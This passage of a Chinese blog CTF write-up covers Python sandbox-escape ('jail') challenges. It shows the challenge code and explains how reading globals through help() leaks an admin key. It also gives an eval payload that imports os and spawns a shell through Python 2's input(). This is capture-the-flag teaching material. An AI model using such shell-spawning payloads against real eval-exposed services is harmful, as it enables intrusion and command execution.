<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_key_var_in_the_local_but_real_in_the_remote = <span class="string">&quot;[DELETED]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(key == fake_key_var_in_the_local_but_real_in_the_remote):</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nooo!!!!&quot;</span>)</span><br><span class="line">        ——————</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(input_data == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    func()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span>(input_data == <span class="string">&quot;2&quot;</span>):</span><br><span class="line">    backdoor()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found the choice&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>测试了一下，进入<code>func()</code>用不了，这里进入2来使用，但是这里的key没给，那么这里该如何利用呢，看源码，这里的key是个全局变量，还是有点小技巧，这里的<code>1</code>并不是完全没用，由于在2中只要key不等于这个就都是利用不了的，<strong>但是</strong>，这里可以在1里面读取<br>，这里可以采用<code>help()</code>进入，然后<code>__main__</code>读取（还可以只有<code>globals()</code>来读），如下：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602154917456.png" alt="image-20240602154917456"></p>
<p>得到key，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a34af94e88aed5c34fb5ccfe08cd14ab</span><br></pre></td></tr></table></figure>

<p>最终得到flag：</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602155017498.png" alt="image-20240602155017498"></p>
<p>学到了，对变量的利用。</p>
<h3 id="python2-input-JAIL"><a href="#python2-input-JAIL" class="headerlink" title="python2 input(JAIL)"></a>python2 input(JAIL)</h3><p>给了附件，部分源代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">print input_data</span><br></pre></td></tr></table></figure>

<p>外面套了一个print，这不就是我本地测试常用的吗，直接传入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)&quot;)</span><br></pre></td></tr></table></figure>

<p>成功：</p>
<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602155417727.png" alt="image-20240602155417727"></p>
<p>然后去看了一下其他师傅的wp，从这个print的格式可以看出是python2，<strong>考点</strong>是下面这个：</p>
<p>在python2中， <code>input</code> 函数从标准输入接收输入，并且自动eval求值，返回求出来的值</p>
<p>在python2中， <code>raw_input</code> 函数从标准输入接收输入，并返回输入字符串</p>
<p>在python3中， <code>input</code> 函数从标准输入接收输入，并返回输入字符串</p>
<p>可以简单的认为： <code>python2中input()</code> &#x3D; <code>python2中eval(raw_input())</code> &#x3D; <code>python3中eval(input())</code></p>
<p>尝试了一下不套一个eval()传入，成功了，所以这里确实要注意一下</p>
<h3 id="l-ke-l-ke-l-ke-JAIL"><a href="#l-ke-l-ke-l-ke-JAIL" class="headerlink" title="l@ke l@ke l@ke(JAIL)"></a>l@ke l@ke l@ke(JAIL)</h3><p>有附件，关键代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fake_key_var_in_the_local_but_real_in_the_remote = &quot;[DELETED]&quot;</span><br><span class="line"></span><br><span class="line">def func():</span><br><span class="line">    code = input(&quot;&gt;&quot;)</span><br><span class="line">    if(len(code)&gt;6):</span><br><span class="line">        return print(&quot;you&#x27;re hacker!&quot;)</span><br><span class="line">    try:</span><br><span class="line">        print(eval(code))</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def backdoor():</span><br><span class="line">    print(&quot;Please enter the admin key&quot;)</span><br><span class="line">    key = input(&quot;&gt;&quot;)</span><br><span class="line">    if(key == fake_key_var_in_the_local_but_real_in_the_remote):</span><br><span class="line">        code = input(&quot;&gt;&quot;)</span><br><span class="line">        try:</span><br><span class="line">            print(eval(code))</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Nooo!!!!&quot;)</span><br><span class="line">——————————</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">if(input_data == &quot;1&quot;):</span><br><span class="line">    func()</span><br><span class="line">    exit(0)</span><br><span class="line">elif(input_data == &quot;2&quot;):</span><br><span class="line">    backdoor()</span><br><span class="line">    exit(0)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;not found the choice&quot;)</span><br><span class="line">    exit(0)</span><br></pre></td></tr></table></figure>

<p>源码和<code>lake lake lake</code>很像，只是将长度限制为6，key仍然是全局变量，还是可以使用<code>help()+__main__</code>来读取，这样就可以读取到变量值：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602161347430.png" alt="image-20240602161347430"></p>
<p>得到key为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">95c720690c2c83f0982ffba63ff87338</span><br></pre></td></tr></table></figure>

<p>再进入2来传参，成功：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602161507943.png" alt="image-20240602161507943"></p>
]]></content>
      <categories>
        <category>Python漏洞</category>
        <category>沙箱逃逸做题总结</category>
      </categories>
  </entry>
</search>
